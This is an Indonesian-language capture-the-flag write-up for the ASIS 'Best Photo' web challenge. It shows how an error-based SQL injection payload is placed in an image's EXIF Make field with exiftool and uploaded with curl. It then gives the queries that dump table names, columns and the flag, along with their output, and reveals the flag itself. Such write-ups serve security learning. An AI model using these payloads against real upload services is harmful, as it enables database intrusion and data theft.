# Best Photo

**Kategori:** web
**Points:** 175
**Deskripsi**

> Go [there](http://bestphoto.asis-ctf.ir/index) and find the flag.

## Write-up

Karena kita cuma bisa mengupload file, dan akan tampil informasi EXIF-nya, maka pasti ini adalah SQL Injection
dengan EXIF metadata.

Cara saya mengeksploit adalah dengan:

    exiftool -Make="'+updatexml(null,(select version()), null) ) -- '" empty.jpg;
    curl -F file=@empty.jpg "http://bestphoto.asis-ctf.ir/submit"

File empty.jpg diciptakan dengan (hanya 160 byte):

    convert -size 1x1 xc:none empty.jpg

Dengan mengganti 'select version()' dengan query lain kita bisa tahu apa nama tabel.


    (concat('.', (SELECT group_concat(table_name separator '|') FROM information_schema.tables WHERE table_schema='photo')))

    XPATH syntax error: 'photos_extratext|tbl_flag_000'

Kolom

    (concat('.', (SELECT group_concat(column_name separator '|') FROM information_schema.columns WHERE table_name='tbl_flag_000')))

     XPATH syntax error: 'id|flag'yohanes@olivia:~$

Dan isinya:

    (concat('.', (SELECT group_concat(concat(id, ' - ', flag) separator '|') FROM tbl_flag_000)))

    XPATH syntax error: '1 - ASIS{908cd5cf7e6f337d232370c'

Bagian kedua flag:

    (concat('.', (SELECT group_concat(concat(id, ' - ', right(flag,11)) separator '|') FROM tbl_flag_000)))

    XPATH syntax error: '1 - ce7e0fd937}'yohanes@olivia:~$


Flagnya: `ASIS{908cd5cf7e6f337d232370ce7e0fd937}`

